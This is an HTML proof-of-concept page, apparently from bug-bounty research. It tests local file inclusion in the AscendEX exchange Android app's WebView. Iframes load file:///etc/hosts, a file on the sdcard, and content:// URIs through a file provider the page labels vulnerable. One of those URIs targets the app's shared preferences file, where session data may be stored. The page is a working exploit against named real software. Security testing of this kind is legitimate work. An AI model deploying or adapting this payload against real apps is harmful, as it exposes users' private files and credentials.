<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LFI Test via Trusted Domain</title>
    <style>
        body { font-family: sans-serif; padding: 10px; }
        h2 { margin-top: 20px; }
        iframe { width: 100%; height: 250px; border: 1px solid; }
        .success { border-color: green; }
        .failure { border-color: red; }
    </style>
</head>
<body>
    <h1>LFI Test Payload Loaded from asdex.me</h1>
    <p>Origin: <script>document.write(window.location.origin);</script></p>
    <p>Testing iframe loading of local schemes based on BaseWebViewActivity settings...</p>
    <hr>

    <h2>Attempting: file:///etc/hosts</h2>
    <iframe id="iframe-file-hosts" src="file:///etc/hosts"
            onload="this.className='success';" onerror="this.className='failure';"></iframe>

    <h2>Attempting: file:///sdcard/Download/poc_test.txt</h2>
    <iframe id="iframe-file-sdcard" src="file:///sdcard/Download/poc_test.txt"
            onload="this.className='success';" onerror="this.className='failure';"></iframe>
    <hr>

    <h2>Attempting: content://com.ascendex.exchange.fileProvider/root-path/etc/hosts</h2>
    <p>(Targets vulnerable MQ File Provider)</p>
    <iframe id="iframe-content-hosts" src="content://com.ascendex.exchange.fileProvider/root-path/etc/hosts"
            onload="this.className='success';" onerror="this.className='failure';"></iframe>

    <h2>Attempting: content://com.ascendex.exchange.fileProvider/root-path/data/data/com.ascendex.exchange/shared_prefs/com.ascendex.exchange_preferences.xml</h2>
    <p>(Targets vulnerable MQ File Provider)</p>
    <iframe id="iframe-content-prefs" src="content://com.ascendex.exchange.fileProvider/root-path/data/data/com.ascendex.exchange/shared_prefs/com.ascendex.exchange_preferences.xml"
            onload="this.className='success';" onerror="this.className='failure';"></iframe>

    <script>
        // Optional: Add load timeout checks if needed
        console.log("Iframes created. Waiting for load/error events...");
    </script>
</body>
</html>
